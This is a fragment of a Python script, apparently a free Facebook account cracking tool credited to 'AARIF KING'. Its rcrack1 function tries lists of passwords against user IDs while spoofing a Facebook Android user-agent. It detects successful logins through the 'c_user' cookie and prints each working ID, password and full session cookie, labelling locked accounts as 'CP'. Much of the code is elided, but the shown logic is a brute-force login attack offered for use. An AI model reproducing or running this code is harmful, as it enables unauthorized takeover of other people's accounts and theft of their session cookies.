...
\033[1;32m      [+]===============================================[+]
\033[1;94m      [+]        CREATED BY   : AARIF KING          \033[1;94m
\033[1;33m      [+]        FACEBOOK    :  AARIF ALI              \033[1;94m
\033[1;31m      [+]        STATUS       :  FREE      \033[1;31m
\033[1;94m      [+]        BEST FRIEND :  ADNAN                    \033[1;94m[+]
\033[1;32m      [+]        TOOL VERSION  :  3.0                \033[1;94m
\033[1;33m      [+]        COUNTRY      :  INDIA                            \033[1;94m
\033[1;31m      [+]===============================================[+]
""")                                              
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/312.0.0.10.103;]', }
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[AARIF-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[LOL-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[AARIF🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
